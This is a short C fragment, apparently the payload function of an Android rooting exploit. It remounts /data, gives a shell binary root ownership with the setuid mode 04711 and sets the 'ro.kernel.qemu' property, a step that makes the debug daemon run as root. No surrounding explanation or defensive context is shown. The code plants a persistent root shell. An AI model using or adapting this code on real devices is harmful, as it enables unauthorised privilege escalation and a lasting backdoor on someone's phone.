static void do_root()
{
	remount_data("/data");
	chown(sh, 0, 0);
	chmod(sh, 04711);
	property_set("ro.kernel.qemu","1");
	exit(0);
}
